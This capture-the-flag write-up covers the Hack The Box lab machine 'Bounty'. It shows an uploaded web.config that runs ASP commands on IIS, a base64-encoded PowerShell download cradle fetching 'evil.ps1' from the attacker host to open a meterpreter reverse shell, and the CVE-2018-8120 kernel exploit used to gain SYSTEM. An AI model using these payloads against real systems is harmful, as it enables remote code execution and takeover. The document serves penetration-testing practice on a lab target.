142 - Bounty
============

Mandatory nmap scan:
```bash
❯❯❯ sudo nmap -sS -Pn --top-ports 200 10.10.10.93
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-12 08:14 CEST
Nmap scan report for 10.10.10.93
Host is up (0.048s latency).
Not shown: 199 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.48 seconds
```

During the enumeration of the web server, one upload page and one storage directory were found:
- `/transper.aspx`
- `/uploadedfiles/`

After a lot of tests on the upload file and much time lost because of the wizard of ImageMagick. I found out that we can upload a `web.config` file that allows to run code on the server. The following `web.config` can be uploaded:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("ipconfig")
output1 = cmd1.StdOut.Readall()
Set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
%>
```

Once downloaded using the URL <http://10.10.10.93/uploadedfiles/web.config>, the following content is shown in the HTTP response:
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 1151
Content-Type: text/html
Server: Microsoft-IIS/7.5
Set-Cookie: ASPSESSIONIDQARSDSQT=FPOFLBLDAHMBNLPPOLELMHNH; path=/
X-Powered-By: ASP.NET
Date: Thu, 12 Jul 2018 14:36:18 GMT
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.93
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{27C3F487-28AC-4CE6-AE3A-1F23518EF7A7}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```

And at the end, the result of the ipconfig command. I needed to search a bit more for the next step but it appears that running powershell is possible with the following upload:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
set objshell=server.createobject("WScript.Shell")
objshell.run "powershell -c ""ping 10.10.14.92""",1,true
set objshell=nothing
response.redirect("/whatever.asp")
%>
```

On the local host, a tcpdump records the ICMP packets:
```bash
❯❯❯ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:46:35.236428 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 5, length 40
16:46:35.236592 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 5, length 40
16:46:40.135173 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 6, length 40
16:46:40.135362 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 6, length 40
16:46:41.108249 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 7, length 40
16:46:41.108382 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 7, length 40
16:46:42.115818 IP 10.10.10.93 > kali: ICMP echo request, id 1, seq 8, length 40
16:46:42.115856 IP kali > 10.10.10.93: ICMP echo reply, id 1, seq 8, length 40
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

Now we have powershell execution, let's create a metasploit setup to have a meterpreter reverse shelli using the web delivery and a powershell reverse shell payload:
```
msf exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.15.38      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  80               yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH  evil.ps1         no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.38      yes       The local listener hostname
   LPORT     8080             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   2   PSH
msf exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 1.

[*] Started HTTP reverse handler on http://10.10.15.38:8080
[*] Using URL: http://10.10.15.38:80/evil.ps1
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $I=new-object net.webclient;$I.proxy=[Net.WebRequest]::GetSystemWebProxy();$I.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $I.downloadstring('http://10.10.15.38/evil.ps1');
```

Now I dont use this powershell command because I prefer a simpler download cradle. Let's generate the payload and encode it in base64 for powershell to execute it and avoid quote or special character issues. Note here that we have to convert it in UTF-16 little endian first:
```bash
❯❯❯ iconv -f ASCII -t UTF-16 <<< 'IEX (New-Object Net.Webclient).downloadstring("http://10.10.15.38/evil.ps1")' | base64
//5JAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBu
AHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAA
LgAxADAALgAxADUALgAzADgALwBlAHYAaQBsAC4AcABzADEAIgApAAoA
```

So now our final `web.config` file looks like:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />  
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
set objshell=server.createobject("WScript.Shell")
objshell.run("powershell -nop -enc //5JAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgAzADgALwBlAHYAaQBsAC4AcABzADEAIgApAAoA"),1,true
response.redirect("/whatever.asp")
%>
```

When uploading this and then accessing the URL <http://10.10.10.93/uploadedfiles/web.config> to trigger it, metasploit shows the web delivery running and opens a materpreter shell and we can get the flag:
```
[*] 10.10.10.93      web_delivery - Delivering Payload
[*] http://10.10.15.38:8080 handling request from 10.10.10.93; (UUID: 3cpmkvux) Staging x86 payload (180825 bytes) ...
[*] Meterpreter session 2 opened (10.10.15.38:8080 -> 10.10.10.93:49190) at 2018-07-13 09:23:54 +0200
msf exploit(multi/script/web_delivery) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > cat 'C:\Users\merlin\Desktop\user.txt'
e29ad89891462e0b09741e3082f44a2f
```

## Privilege escalation

Once on the box with meterpreter, the basic `getsystem` failed. I used an exploit for CVE-2018-8120 found here: <https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120>. This goes as follow:
```
meterpreter > upload x64.exe
[*] uploading  : x64.exe -> x64.exe
[*] Uploaded 92.00 KiB of 92.00 KiB (100.0%): x64.exe -> x64.exe
[*] uploaded   : x64.exe -> x64.exe
meterpreter > shell
Process 2240 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Windows\Temp>x64.exe "whoami"
x64.exe "whoami"
CVE-2018-8120 exploit by @unamer(https://github.com/unamer)
[+] Get manager at fffff900c1ca3ca0,worker at fffff900c1c9dca0
[+] Triggering vulnerability...
[+] Overwriting...fffff800019fec38
[+] Elevating privilege...
[+] Cleaning up...
[+] Trying to execute whoami as SYSTEM...
[+] Process created with pid 2472!
nt authority\system
```

OK, so the exploit is working, now let's have a shell with this privileges. We can reuse the same web delivery metasploit configuration that is alread in place. Just execute the powershell directly with the exploit:
```
c:\Windows\Temp>x64.exe "powershell -nop -enc //5JAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgAzADgALwBlAHYAaQBsAC4AcABzADEAIgApAAoA"
x64.exe "powershell -nop -enc //5JAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgAzADgALwBlAHYAaQBsAC4AcABzADEAIgApAAoA"
CVE-2018-8120 exploit by @unamer(https://github.com/unamer)
[+] Get manager at fffff900c1cd4ca0,worker at fffff900c1cc9060
[+] Triggering vulnerability...
[+] Overwriting...fffff800019fec38

[*] 10.10.10.93      web_delivery - Delivering Payload
[*] http://10.10.15.38:8080 handling request from 10.10.10.93; (UUID: x7rzstfi) Staging x86 payload (180825 bytes) ...
[*] Meterpreter session 10 opened (10.10.15.38:8080 -> 10.10.10.93:49182) at 2018-07-13 10:43:11 +0200
```

And we see that metasploit is directly receiving a new meterpreter session. Let's interact with this one and get the flag:
```
msf exploit(multi/script/web_delivery) > sessions -i 10
[*] Starting interaction with 10...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2520 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

[CUT CUT CUT]

c:\Users\Administrator\Desktop>type root.txt
type root.txt
c837f7b699feef5475a0c079f9d4f5ea
```
